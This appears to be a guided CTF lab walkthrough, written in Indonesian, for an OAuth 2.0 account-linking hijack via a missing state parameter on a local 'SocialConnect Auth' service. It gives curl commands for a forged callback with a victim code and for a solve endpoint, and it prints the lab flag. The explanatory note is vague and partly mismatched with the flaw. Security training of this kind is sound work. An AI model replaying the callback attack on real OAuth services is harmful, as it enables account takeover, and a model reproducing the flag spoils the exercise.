# Panduan Praktik Terbimbing: Investigasi OAuth 2.0 Account Linking Hijacking via Missing State

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **SocialConnect Auth** pada `http://127.0.0.1:8053`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8053/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A07-02","port":8053,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8053/`
3. Amati antarmuka operasional **SocialConnect Auth** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (OAuth 2.0 Account Linking Hijacking via Missing State)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s "http://127.0.0.1:8053/oauth/callback?code=AUTH_CODE_VICTIM"
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Accept: text/html` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8053/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8053/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A07-02","flag":"ZITERA{04uth_m1ss1ng_st4t3_4cc0unt_l1nk_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{04uth_m1ss1ng_st4t3_4cc0unt_l1nk_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
